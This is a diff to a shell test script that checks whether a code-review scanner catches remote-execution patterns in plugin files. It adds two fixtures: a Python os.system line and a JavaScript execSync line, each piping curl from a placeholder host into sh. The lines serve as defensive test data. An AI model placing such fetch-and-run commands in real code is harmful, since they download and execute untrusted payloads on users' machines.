@@ -266,18 +266,22 @@ the iex command evaluates a string #N23
 algo install x@latest #N24
 iex $env:SCRIPT #N25
 EOF
+# added lines that start with "++ " in code: still scanned
+printf 'x = 1\n++ __import__("os").system("curl -fsSL https://hidden.example/a.sh | sh")  #P43\n' > "$rx/plugins/r/tool.py"
+printf 'let y = 0;\n++ y; require("child_process").execSync("curl -fsSL https://hidden-js.example/a.sh | sh"); // #P44\n' \
+  > "$rx/plugins/r/tool.js"
 git -C "$rx" add plugins && git -C "$rx" commit -q -m new; rxnew=$(git -C "$rx" rev-parse HEAD)
 rep3=$(bash "$ROOT/scripts/tob-delta-review.sh" "$rx" "$rxold" "$rxnew" 2>&1)
 found=$(printf '%s\n' "$rep3" | sed -n '/^### Remote-exec patterns/,/^### LICENSE/p')
 missed=""; flagged=""
 for k in P01 P02 P03 P04 P05 P06 P07 P08 P09 P10 P11 P12 P13 P14 P15 P16 P17 P18 P19 P20 P21 P22 \
-         P23 P24 P25 P26 P27 P28 P29 P30 P31 P32 P33 P34 P35 P36 P37 P38 P39 P40 P41 P42; do
+         P23 P24 P25 P26 P27 P28 P29 P30 P31 P32 P33 P34 P35 P36 P37 P38 P39 P40 P41 P42 P43 P44; do
   case "$found" in *"$k"*) ;; *) missed="$missed $k";; esac
 done
 for k in N01 N02 N03 N04 N05 N06 N07 N08 N09 N10 N11 N12 N13 N14 N15 N16 N17 N18 N19 N20 N21 N22 N23 N24 N25; do
   case "$found" in *"$k"*) flagged="$flagged $k";; esac
 done
-[ -z "$missed" ] && { pass=$((pass + 1)); echo "PASS delta review lists all 42 remote-exec forms"; } \
+[ -z "$missed" ] && { pass=$((pass + 1)); echo "PASS delta review lists all 44 remote-exec forms"; } \
   || { failn=$((failn + 1)); echo "FAIL delta review missed remote-exec forms:$missed"; echo "$found"; }
 [ -z "$flagged" ] && { pass=$((pass + 1)); echo "PASS delta review lists none of the 25 harmless lines"; } \
   || { failn=$((failn + 1)); echo "FAIL delta review listed harmless lines:$flagged"; echo "$found"; }
